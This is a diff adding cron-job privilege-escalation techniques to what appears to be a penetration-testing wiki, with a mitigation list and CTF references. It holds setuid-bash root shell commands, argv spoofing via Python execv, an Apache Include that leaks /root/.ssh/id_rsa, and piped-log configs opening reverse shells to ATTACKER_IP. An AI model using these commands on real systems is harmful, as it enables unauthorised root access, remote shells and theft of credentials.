@@ -407,6 +407,160 @@ If a script is executed by root has a “**\***” inside a command, you could e
 rsync -a *.sh rsync://host.back/src/rbd #You can create a file called "-e sh myscript.sh" so the script will execute our script
 ```
 
+**If the wildcard is preceded of a path like** _**/some/path/*\***_ **, it's not vulnerable (even** _**./*\***_ **is not).**
+
+Read the following page for more wildcard exploitation tricks:
+
+
+{{#ref}}
+wildcards-spare-tricks.md
+{{#endref}}
+
+### Cron script overwriting and symlink
+
+If you **can modify a cron script** executed by root, you can get a shell very easily:
+
+```bash
+echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > </PATH/CRON/SCRIPT>
+#Wait until it is executed
+/tmp/bash -p
+```
+
+If the script executed by root uses a **directory where you have full access**, maybe it could be useful to delete that folder and **create a symlink folder to another one** serving a script controlled by you
+
+```bash
+ln -d -s </PATH/TO/POINT> </PATH/CREATE/FOLDER>
+```
+
+### Frequent cron jobs
+
+You can monitor the processes to search for processes that are being executed every 1, 2 or 5 minutes. Maybe you can take advantage of it and escalate privileges.
+
+For example, to **monitor every 0.1s during 1 minute**, **sort by less executed commands** and delete the commands that have been executed the most, you can do:
+
+```bash
+for i in $(seq 1 610); do ps -e --format cmd >> /tmp/monprocs.tmp; sleep 0.1; done; sort /tmp/monprocs.tmp | uniq -c | grep -v "\[" | sed '/^.{200}./d' | sort | grep -E -v "\s*[6-9][0-9][0-9]|\s*[0-9][0-9][0-9][0-9]"; rm /tmp/monprocs.tmp;
+```
+
+**You can also use** [**pspy**](https://github.com/DominicBreuker/pspy/releases) (this will monitor and list every process that starts).
+
+### Invisible cron jobs
+
+It's possible to create a cronjob **putting a carriage return after a comment** (without newline character), and the cron job will work. Example (note the carriage return char):
+
+```bash
+#This is a comment inside a cron config file\r* * * * * echo "Surprise!"
+```
+
+### Cron inspecting processes via pgrep and argv spoofing (apache2ctl -t + piped logs RCE)
+
+When a privileged cron uses `pgrep -f`/`pgrep -lfa` to find a process by its full argv and then derives a command from that match, you can spoof argv to hijack what the cron will execute.
+
+Common anti-pattern seen in the wild (simplified):
+
+```bash
+#!/usr/bin/bash
+while read pid _cmd ; do
+    # Replace apache2 with apache2ctl and add -t (config test)
+    cmd="${_cmd/apache2/apache2ctl} -t"
+    $cmd >/dev/null 2>&1
+    RET=$?
+done <<< $(/usr/bin/pgrep -lfa "^/opt/zroweb/sbin/apache2.-k.start.-d./opt/zroweb/conf")
+exit $RET
+```
+
+Abuse flow:
+- Spawn a long-lived dummy process with a forged argv that matches the cron’s regex, and inject extra flags like `-f /path/to/attacker.conf`.
+- Cron’s `pgrep -lfa` will pick your fake argv, construct the command, and run it as root.
+
+Forge argv with Python `execv`:
+
+```bash
+python3 - <<'PY'
+import os
+# argv[0] and args are fully controlled here
+os.execv('/bin/sleep', [
+    '/opt/zroweb/sbin/apache2',
+    '-k','start',
+    '-d','/opt/zroweb/conf',
+    '-f','/dev/shm/root.conf',
+    '600' # sleep arg to keep it alive
+])
+PY
+```
+
+Now provide a malicious Apache config at `/dev/shm/root.conf` and wait for the cron to run the equivalent of:
+
+```bash
+apache2ctl -k start -d /opt/zroweb/conf -f /dev/shm/root.conf -t
+```
+
+Two powerful primitives follow:
+
+- Root partial file read via Include: cause a parse error that leaks snippets of sensitive files in error output
+
+```apache
+# /dev/shm/root.conf
+Include /root/.ssh/id_rsa
+```
+
+- Root RCE via piped loggers: even with `-t` (config test), Apache spawns programs configured as [piped logs](https://httpd.apache.org/docs/2.4/logs.html#piped). Define a piped `ErrorLog`/`CustomLog` to execute arbitrary commands as root:
+
+```apache
+# /dev/shm/root.conf
+ServerRoot /dev/shm
+PidFile /dev/shm/httpd.pid
+ErrorLog "|/bin/bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'"
+LogLevel warn
+```
+
+or
+
+```apache
+ServerRoot /dev/shm
+PidFile /dev/shm/httpd.pid
+LogFormat "%h %l %u %t \"%r\" %>s %b" x
+CustomLog "|/bin/bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'" x
+```
+
+Mitigations:
+- Avoid `pgrep -f`/`pgrep -lfa` to identify daemons; use PID files, service managers, or validate the executable inode of PIDs.
+- Never `eval`/execute unquoted strings. Use `execve`-style argv arrays; avoid constructing shell commands from process command lines.
+- Don’t pass user-influenced `-f`/`-d` to `apache2ctl -t`; point to fixed, root-owned configs only.
+
+
+
+Check if any scheduled job is vulnerable. Maybe you can take advantage of a script being executed by root (wildcard vuln? can modify files that root uses? use symlinks? create specific files in the directory that root uses?).
+
+```bash
+crontab -l
+ls -al /etc/cron* /etc/at*
+cat /etc/cron* /etc/at* /etc/anacrontab /var/spool/cron/crontabs/root 2>/dev/null | grep -v "^#"
+```
+
+### Cron path
+
+For example, inside _/etc/crontab_ you can find the PATH: _PATH=**/home/user**:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin_
+
+(_Note how the user "user" has writing privileges over /home/user_)
+
+If inside this crontab the root user tries to execute some command or script without setting the path. For example: _\* \* \* \* root overwrite.sh_\
+Then, you can get a root shell by using:
+
+```bash
+echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/overwrite.sh
+#Wait cron job to be executed
+/tmp/bash -p #The effective uid and gid to be set to the real uid and gid
+```
+
+### Cron using a script with a wildcard (Wildcard Injection)
+
+If a script is executed by root has a “**\***” inside a command, you could exploit this to make unexpected things (like privesc). Example:
+
+```bash
+rsync -a *.sh rsync://host.back/src/rbd #You can create a file called "-e sh myscript.sh" so the script will execute our script
+```
+
 **If the wildcard is preceded of a path like** _**/some/path/\***_ **, it's not vulnerable (even** _**./\***_ **is not).**
 
 Read the following page for more wildcard exploitation tricks:
@@ -1674,6 +1828,9 @@ cisco-vmanage.md
 - [https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)
 - [https://www.linode.com/docs/guides/what-is-systemd/](https://www.linode.com/docs/guides/what-is-systemd/)
 
+
+- [HTB: Zero (0xdf) – abusing pgrep argv matching + apache2ctl -t to root via piped logs](https://0xdf.gitlab.io/2025/08/12/htb-zero.html)
+- [Apache 2.4 – Log Files and Piped Logs](https://httpd.apache.org/docs/2.4/logs.html#piped)
 
 ## Android rooting frameworks: manager-channel abuse
 
